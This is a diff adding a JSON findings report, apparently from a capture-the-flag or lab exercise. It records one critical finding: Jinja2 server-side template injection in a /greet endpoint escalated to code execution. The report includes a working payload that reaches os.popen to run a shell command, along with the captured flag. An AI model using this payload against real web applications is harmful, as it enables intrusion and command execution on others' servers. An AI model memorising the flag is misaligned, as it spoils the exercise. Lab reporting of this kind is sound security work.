@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:57:31.036539+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "963a96a7-ef0b-453c-abef-223b999373c5",
+      "timestamp": "2026-04-14T15:57:31.036453+00:00",
+      "title": "SSTI to RCE - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41165",
+      "description": "Server-Side Template Injection in /greet endpoint allowed arbitrary Python code execution via Jinja2 template injection. Exploited to read /tmp/flag file containing the CTF flag.",
+      "evidence": "flag{5e88d1bf-228f-4335-a4da-96517cb69114}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /tmp/flag').read()}}",
+        "expected": "flag{5e88d1bf-228f-4335-a4da-96517cb69114}"
+      }
+    }
+  ],
+  "diagrams": []
+}
